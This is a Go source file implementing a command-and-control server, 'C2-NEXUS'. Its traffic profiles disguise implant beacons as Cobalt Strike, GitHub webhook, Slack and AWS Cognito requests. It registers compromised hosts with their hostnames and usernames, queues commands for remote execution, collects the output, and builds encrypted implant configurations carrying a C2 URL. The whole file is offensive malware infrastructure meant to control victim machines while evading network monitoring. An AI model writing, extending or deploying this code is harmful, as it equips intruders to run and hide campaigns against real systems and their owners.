package c2

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"time"
)

// C2Profile defines a malleable C2 profile
type C2Profile struct {
	Name          string            `json:"name"`
	UserAgent     string            `json:"user_agent"`
	HTTPMethod    string            `json:"http_method"` // GET, POST
	Headers       map[string]string `json:"headers"`
	Jitter        int               `json:"jitter"` // percentage
	SleepTime     time.Duration     `json:"sleep_time"`
	KillDate      time.Time         `json:"kill_date"`
	MaxRetries    int               `json:"max_retries"`
	EncryptionKey []byte            `json:"-"`
	Domain        string            `json:"domain"`
	URIPaths      []string          `json:"uri_paths"` // URIs for beaconing
	GETURI        string            `json:"get_uri"`
	POSTURI       string            `json:"post_uri"`
}

// Beacon represents an implant beacon
type Beacon struct {
	ID        string    `json:"id"`
	Hostname  string    `json:"hostname"`
	Username  string    `json:"username"`
	OS        string    `json:"os"`
	Arch      string    `json:"arch"`
	PID       int       `json:"pid"`
	LastCheck time.Time `json:"last_check"`
	Sleep     int       `json:"sleep"`
	Profile   string    `json:"profile"`
}

// Task represents a command task for an implant
type Task struct {
	ID        string `json:"id"`
	BeaconID  string `json:"beacon_id"`
	Command   string `json:"command"`
	Args      string `json:"args"`
	Status    string `json:"status"` // pending, running, complete
	Output    string `json:"output"`
	Timestamp int64  `json:"timestamp"`
}

// C2NEXUS is the command and control engine
type C2NEXUS struct {
	Profile   *C2Profile
	Beacons   map[string]*Beacon
	Tasks     map[string]*Task
	Callbacks []string // URLs for fallback comms
}

// DefaultProfiles contains built-in C2 profiles
var DefaultProfiles = map[string]*C2Profile{
	"cobalt_strike_mimic": {
		Name:       "cobalt_strike_mimic",
		UserAgent:  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		HTTPMethod: "POST",
		Headers: map[string]string{
			"Accept":          "text/html,application/xhtml+xml",
			"Accept-Language": "en-US,en;q=0.9",
		},
		Jitter:     20,
		SleepTime:  60 * time.Second,
		MaxRetries: 3,
		URIPaths:   []string{"/updates", "/news", "/cdn", "/api/v1/check"},
		GETURI:     "/updates",
		POSTURI:    "/submit",
	},
	"github_mimic": {
		Name:       "github_mimic",
		UserAgent:  "GitHub-Hookshot/abcd1234",
		HTTPMethod: "POST",
		Headers: map[string]string{
			"Content-Type":   "application/json",
			"X-GitHub-Event": "push",
		},
		Jitter:     15,
		SleepTime:  120 * time.Second,
		MaxRetries: 5,
		URIPaths:   []string{"/webhook", "/api/events", "/hooks/github"},
		GETURI:     "/api/status",
		POSTURI:    "/webhook",
	},
	"slack_mimic": {
		Name:       "slack_mimic",
		UserAgent:  "Slackbot 1.0 (+https://api.slack.com/robots)",
		HTTPMethod: "POST",
		Headers: map[string]string{
			"Content-Type": "application/json",
		},
		Jitter:     25,
		SleepTime:  90 * time.Second,
		MaxRetries: 3,
		URIPaths:   []string{"/slack/events", "/api/messages", "/hooks/incoming"},
		GETURI:     "/api/ping",
		POSTURI:    "/slack/events",
	},
	"aws_mimic": {
		Name:       "aws_mimic",
		UserAgent:  "aws-sdk-go/1.44.0 (go1.19; windows; amd64)",
		HTTPMethod: "POST",
		Headers: map[string]string{
			"Content-Type": "application/x-amz-json-1.1",
			"X-Amz-Target": "AWSCognitoIdentityProviderService.InitiateAuth",
		},
		Jitter:     10,
		SleepTime:  180 * time.Second,
		MaxRetries: 7,
		URIPaths:   []string{"/cognito", "/api/gateway", "/lambda/invoke"},
		GETURI:     "/cognito/health",
		POSTURI:    "/cognito/auth",
	},
}

// NewC2NEXUS creates a new C2 engine with a profile
func NewC2NEXUS(profileName string) (*C2NEXUS, error) {
	profile, ok := DefaultProfiles[profileName]
	if !ok {
		return nil, fmt.Errorf("profile '%s' not found", profileName)
	}

	// Generate encryption key
	key := make([]byte, 32)
	if _, err := io.ReadFull(rand.Reader, key); err != nil {
		return nil, err
	}
	profile.EncryptionKey = key

	return &C2NEXUS{
		Profile:   profile,
		Beacons:   make(map[string]*Beacon),
		Tasks:     make(map[string]*Task),
		Callbacks: []string{},
	}, nil
}

// GenerateImplantConfig generates implant configuration
func (c *C2NEXUS) GenerateImplantConfig() map[string]interface{} {
	config := map[string]interface{}{
		"profile":     c.Profile.Name,
		"user_agent":  c.Profile.UserAgent,
		"http_method": c.Profile.HTTPMethod,
		"headers":     c.Profile.Headers,
		"jitter":      c.Profile.Jitter,
		"sleep":       c.Profile.SleepTime.Seconds(),
		"max_retries": c.Profile.MaxRetries,
		"get_uri":     c.Profile.GETURI,
		"post_uri":    c.Profile.POSTURI,
		"uri_paths":   c.Profile.URIPaths,
		"kill_date":   c.Profile.KillDate.Unix(),
		"key":         base64.StdEncoding.EncodeToString(c.Profile.EncryptionKey),
	}

	return config
}

// EncryptBeacon encrypts beacon data
func (c *C2NEXUS) EncryptBeacon(plaintext []byte) ([]byte, error) {
	block, err := aes.NewCipher(c.Profile.EncryptionKey)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}

	return gcm.Seal(nonce, nonce, plaintext, nil), nil
}

// DecryptBeacon decrypts beacon data
func (c *C2NEXUS) DecryptBeacon(ciphertext []byte) ([]byte, error) {
	block, err := aes.NewCipher(c.Profile.EncryptionKey)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

// RegisterBeacon registers a new beacon
func (c *C2NEXUS) RegisterBeacon(beacon *Beacon) string {
	beacon.ID = generateID()
	beacon.LastCheck = time.Now()
	beacon.Profile = c.Profile.Name
	c.Beacons[beacon.ID] = beacon
	fmt.Printf("[+] C2-NEXUS beacon registered: %s (%s/%s)\n", beacon.ID, beacon.Hostname, beacon.OS)
	return beacon.ID
}

// GetTasks gets pending tasks for a beacon
func (c *C2NEXUS) GetTasks(beaconID string) []*Task {
	var tasks []*Task
	for _, task := range c.Tasks {
		if task.BeaconID == beaconID && task.Status == "pending" {
			tasks = append(tasks, task)
		}
	}
	return tasks
}

// AddTask adds a new task
func (c *C2NEXUS) AddTask(beaconID, command, args string) *Task {
	task := &Task{
		ID:        generateID(),
		BeaconID:  beaconID,
		Command:   command,
		Args:      args,
		Status:    "pending",
		Timestamp: time.Now().Unix(),
	}
	c.Tasks[task.ID] = task
	return task
}

// UpdateTaskResult updates task output
func (c *C2NEXUS) UpdateTaskResult(taskID, output string) {
	if task, ok := c.Tasks[taskID]; ok {
		task.Output = output
		task.Status = "complete"
	}
}

// GetActiveBeacons returns all active beacons
func (c *C2NEXUS) GetActiveBeacons() []*Beacon {
	var active []*Beacon
	for _, beacon := range c.Beacons {
		if time.Since(beacon.LastCheck) < 5*time.Minute {
			active = append(active, beacon)
		}
	}
	return active
}

// MalleableEncode encodes data using profile-specific format
func (c *C2NEXUS) MalleableEncode(data []byte) ([]byte, error) {
	// Base64 encode then apply profile-specific transformation
	encoded := base64.StdEncoding.EncodeToString(data)

	// Wrap in HTTP-like format based on profile
	var wrapped map[string]interface{}
	switch c.Profile.Name {
	case "github_mimic":
		wrapped = map[string]interface{}{
			"ref":     "refs/heads/main",
			"before":  encoded[:32],
			"after":   encoded,
			"commits": []map[string]string{{"message": encoded}},
		}
	case "slack_mimic":
		wrapped = map[string]interface{}{
			"type":    "message",
			"text":    encoded,
			"channel": "general",
		}
	default:
		wrapped = map[string]interface{}{
			"data": encoded,
			"id":   generateID(),
		}
	}

	return json.Marshal(wrapped)
}

// BeaconCheckin handles real HTTP check-in from an implant
func (c *C2NEXUS) BeaconCheckin(beaconID string, data []byte) error {
	beacon, ok := c.Beacons[beaconID]
	if !ok {
		return fmt.Errorf("beacon not found: %s", beaconID)
	}

	beacon.LastCheck = time.Now()
	fmt.Printf("[+] Beacon %s checked in\n", beaconID)
	return nil
}

// ExecuteTask remotely executes a task on a beacon
func (c *C2NEXUS) ExecuteTask(beaconID, command string) (*Task, error) {
	if _, ok := c.Beacons[beaconID]; !ok {
		return nil, fmt.Errorf("beacon not found: %s", beaconID)
	}

	task := c.AddTask(beaconID, command, "")
	fmt.Printf("[+] Task %s assigned to beacon %s: %s\n", task.ID, beaconID, command)
	return task, nil
}

// GetBeaconResults retrieves completed task results
func (c *C2NEXUS) GetBeaconResults(beaconID string) []*Task {
	var results []*Task
	for _, task := range c.Tasks {
		if task.BeaconID == beaconID && task.Status == "complete" {
			results = append(results, task)
		}
	}
	return results
}

// GenerateImplantBinary generates a configuration for the implant
func (c *C2NEXUS) GenerateImplantBinary(beaconID string) ([]byte, error) {
	config := c.GenerateImplantConfig()
	config["beacon_id"] = beaconID
	config["c2_url"] = "https://" + c.Profile.Domain

	data, err := json.MarshalIndent(config, "", "  ")
	if err != nil {
		return nil, err
	}

	encrypted, err := c.EncryptBeacon(data)
	if err != nil {
		return nil, err
	}

	return encrypted, nil
}

// MalleableDecode decodes profile-specific format
func (c *C2NEXUS) MalleableDecode(data []byte) ([]byte, error) {
	var wrapped map[string]interface{}
	if err := json.Unmarshal(data, &wrapped); err != nil {
		return nil, err
	}

	// Extract encoded data based on profile
	var encoded string
	switch c.Profile.Name {
	case "github_mimic":
		if after, ok := wrapped["after"].(string); ok {
			encoded = after
		}
	case "slack_mimic":
		if text, ok := wrapped["text"].(string); ok {
			encoded = text
		}
	default:
		if d, ok := wrapped["data"].(string); ok {
			encoded = d
		}
	}

	if encoded == "" {
		return nil, fmt.Errorf("no encoded data found")
	}

	return base64.StdEncoding.DecodeString(encoded)
}

func generateID() string {
	b := make([]byte, 8)
	rand.Read(b)
	return base64.URLEncoding.EncodeToString(b)
}
